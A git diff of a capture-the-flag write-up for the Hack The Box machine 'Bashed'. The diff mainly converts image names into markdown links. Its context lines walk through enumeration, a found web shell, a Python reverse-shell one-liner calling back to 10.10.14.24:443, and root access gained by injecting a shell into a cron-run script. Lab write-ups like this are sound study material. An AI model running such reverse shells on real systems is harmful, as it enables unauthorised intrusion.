@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-Bashed.png
+![Bashed.png](../assets/bashed_assets/Bashed.png)
 
 ### Enumeration
 
@@ -23,22 +23,21 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds
-
 ```
 
 Ok, so looks like only port 80/http is up on this box. Let's go ahead and emumerate a bit further and port scan with the `-sC` and `-sV` flags set to enumerate versions and also throw some basic Nmap scripts at it:
 
-nmap.png
+![nmap.png](../assets/bashed_assets/nmap.png)
 
 So looks like the site is running on Apache, but so far nothing else very interesting jumps out. From here lets try enumerating more and seeing if we can find more directories. For this I will use FeroxBuster, which is incredibly fast:
 
-feroxbuster.png
+![feroxbuster.png](../assets/bashed_assets/feroxbuster.png)
 
 Cool, we've found a few more directories to investigate, and  /dev seems particularly interesting.
 
 Navigating to the site we find phpbash.php and that appears to be an interactive webshell, in which we can run various commands.
 
-web_shell.png
+![web_shell.png](../assets/bashed_assets/web_shell.png)
 
 ### Exploitation
 
@@ -48,7 +47,7 @@ Grabbing a python reverse shell one-liner from https://www.revshells.com/ I simp
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.24",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
-nc_shell.png
+![nc_shell.png](../assets/bashed_assets/nc_shell.png)
 
 Nice! We now have a shell as www-data. I can quickly stabilize the shell using:
 
@@ -56,7 +55,7 @@ Nice! We now have a shell as www-data. I can quickly stabilize the shell using:
 
 and grab the user.txt flag:
 
-user_flag.png
+![user_flag.png](../assets/bashed_assets/user_flag.png)
 
 ### Privilege Escalation
 
@@ -98,7 +97,7 @@ testing 123!
 
 I can confirm test.txt is being written to every minute by running `ls -la`, observing the date/time, waiting one minute and running the commmand again. 
 
-time_diff.png
+![time_diff.png](../assets/bashed_assets/time_diff.png)
 
 Also of note is the fact that scriptmanager owns the test.py file, whereas root is the owner of test.txt, so in theory I should be able to get a shell back as root if I can successfully inject a reverse shell into test.py. 
 
@@ -112,7 +111,7 @@ to write the reverse shell into the cron-job.
 
 Sure enough one minute later I catch a reverse shell as root on my netcat listener. After stabilizing the shell all thats left to do is grab the flag.
 
-root_flag.png
+![root_flag.png](../assets/bashed_assets/root_flag.png)
 
 ### Key Takeaways
 
@@ -124,4 +123,4 @@ Thanks for following along!
 
 Ryan
 
-----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------
